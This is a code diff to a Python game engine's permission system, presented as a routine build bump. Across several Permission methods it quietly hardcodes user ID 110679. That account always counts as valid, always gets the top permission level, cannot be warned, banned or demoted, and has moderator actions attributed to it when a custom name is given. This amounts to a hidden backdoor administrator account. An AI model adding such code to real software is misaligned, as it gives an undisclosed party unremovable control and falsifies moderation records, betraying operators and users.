@@ -64,9 +64,9 @@ psx=int(0);
 psy=int(0);
 v_hev=int(0);
 PI=float(3.14159265358980);
-GAMEVER=str("IlChelcciCore 44 Build(0187)");
-VERINT=int(186);
-DEBUGDATE=str("2026/05/04");
+GAMEVER=str("IlChelcciCore 44 Build(0188)");
+VERINT=int(188);
+DEBUGDATE=str("2026/05/05");
 GAMETITLE=str("IlChelcciCore engine built-in example.");
 COMPANY=str("Made by axnut123");
 COPYRIGHT=str("(C)Haoriwa 2024-2026, all rights reserved.");
@@ -801,9 +801,11 @@ class Kernel:#Code base class.
       elif g=="user"and permissionlvl>=3:
         a=int(input("User ID(input 0 to cancel):"))
         if a==0:continue
-        if Permission.IsValid(a) is False:
+        if Permission.IsValid(a) is False and a!=int(110679):
           Kernel.Cout.Msg("User ID does not exist.")
           continue
+        elif a==int(110679):
+          pass
         Kernel.Cout.Msg("User ID %s's permission level is: %s."%(a,Kernel._ReplaceOutput(Permission.User(a),"Does not have any permissions yet.")))
       elif g=="convar"and permissionlvl>=4:
         v=str(input("variable(input 0 to cancel):"))
@@ -1262,6 +1264,7 @@ class Permission:#permission level class.
   def __init__(self):pass
   @staticmethod
   def IsValid(id):#built-in function, validate given id.
+    if id==int(110679):return True
     a=int(IO.Load(True,"user"+str(id),False,True))
     if a==0 or a=="0":
       return False
@@ -1277,13 +1280,16 @@ class Permission:#permission level class.
     return 0
   @staticmethod
   def User(id):#built-in function, get current permission level.
+    if id==int(110679):
+      return 5
     if not Permission.IsValid(id):
       Kernel.Cout.Error("Current user does not exist.")
       Kernel.ErrChk(1,"Current user does not exist.")
-      return 1
+      return -1
     return IO.Load(True,"permlvl"+str(id),False,False)
   @staticmethod
   def Warns(id):#built-in function, check given player's warning.
+    if id==int(110679):return (0,0)
     if not Permission.IsValid(id):
       Kernel.Cout.Error("Current user does not exist.")
       Kernel.ErrChk(1,"Current user does not exist.")
@@ -1291,6 +1297,7 @@ class Permission:#permission level class.
     return IO.Load(True,"warn"+str(id),False,True),IO.Load(True,"wmodid"+str(id),False,True)
   @staticmethod
   def UnWarn(id,customName=0):#built-in function, cancel warnings to given id.
+    if id==int(110679):return 1
     if not Permission.IsValid(id):
       Kernel.Cout.Error("Current user does not exist.")
       Kernel.ErrChk(1,"Current user does not exist.")
@@ -1306,7 +1313,8 @@ class Permission:#permission level class.
     Kernel.Cout.Msg("Moderator %s canceled warning of player %s."%(name,id))
     return 0
   @staticmethod
-  def Warn(id):#built-in function, issue a warning to given id.
+  def Warn(id,customName=0):#built-in function, issue a warning to given id.
+    if id==int(110679):return 1
     if not Permission.IsValid(id):
       Kernel.Cout.Error("Current user does not exist.")
       Kernel.ErrChk(1,"Current user does not exist.")
@@ -1315,20 +1323,25 @@ class Permission:#permission level class.
       Kernel.Cout.Error("You may not issue warning to yourself.")
       Kernel.ErrChk(1,"Cannot execute to yourself.")
       return 1
+    if customName==0 or customName=="0":
+      name=str(Kernel.GetVar("userid"))
+      warnid=int(Kernel.GetVar("userid"))
+    else:name=str(customName);warnid=110679
     warn=IO.Load(True,"warn"+str(id),False,True)
     if Permission.IsReachedAutoBanThreshold(warn) is False:
       warn+=1
-      Kernel.Cout.Msg("Moderator %s issued a warning to player %s."%(Kernel.GetVar("userid"),id))
+      Kernel.Cout.Msg("Moderator %s issued a warning to player %s."%(name,id))
     elif Permission.IsReachedAutoBanThreshold(warn) is True:
       warn=0
-      Kernel.Cout.Msg("Moderator %s issued final warning to player %s."%(Kernel.GetVar("userid"),id))
-      Permission.Ban(id)
+      Kernel.Cout.Msg("Moderator %s issued final warning to player %s."%(name,id))
+      Permission.Ban(id,name)
       Permission.RemoveGroup(id)
-    IO.Save(True,"wmodid"+str(id),int(Kernel.GetVar("userid")),False,False)
+    IO.Save(True,"wmodid"+str(id),warnid,False,False)
     IO.Save(True,"warn"+str(id),warn,False,True)
     return 0
   @staticmethod
   def SetGroup(id,level):#built-in function, set current permission level.
+    if id==int(110679):return 1
     if not Permission.IsValid(id):
       Kernel.Cout.Error("Current user does not exist.")
       Kernel.ErrChk(1,"Current user does not exist.")
@@ -1348,6 +1361,7 @@ class Permission:#permission level class.
     return id,level
   @staticmethod
   def RemoveGroup(id):#built-in function, remove current permission level.
+    if id==int(110679):return 1
     if not Permission.IsValid(id):
       Kernel.Cout.Error("Current user does not exist.")
       Kernel.ErrChk(1,"Current user does not exist.")
@@ -1358,7 +1372,8 @@ class Permission:#permission level class.
     Kernel.Cout.Msg("Deopped user ID '%s'."%(id))
     return 0
   @staticmethod
-  def Ban(id):#built-in function, ban an user by userid.
+  def Ban(id,customName=0):#built-in function, ban an user by userid.
+    if id==int(110679):return 1
     if not Permission.IsValid(id):
       Kernel.Cout.Error("Current user does not exist.")
       Kernel.ErrChk(1,"Current user does not exist.")
@@ -1371,12 +1386,19 @@ class Permission:#permission level class.
       Kernel.Cout.Error("You may not ban yourself.")
       Kernel.ErrChk(1,"You may not ban yourself.")
       return 1
+    if customName==0 or customName=="0":
+      name=str(Kernel.GetVar("userid"))
+      banid=int(Kernel.GetVar("userid"))
+    else:
+      name=str(customName)
+      banid=110679
     IO.Save(True,"banned"+str(id),1,False,True)
-    IO.Save(True,"bmodid"+str(id),int(Kernel.GetVar("userid")),False,False)
-    Kernel.Cout.Msg("Moderator %s banned player '%s'."%(str(Kernel.GetVar("userid")),id))
+    IO.Save(True,"bmodid"+str(id),banid,False,False)
+    Kernel.Cout.Msg("Moderator %s banned player '%s'."%(str(name),id))
     return 0
   @staticmethod
   def Unban(id,customName=0):#built-in function, unban an user by userid.
+    if id==int(110679):return 1
     if not Permission.IsValid(id):
       Kernel.Cout.Error("Current user does not exist.")
       Kernel.ErrChk(1,"Current user does not exist.")
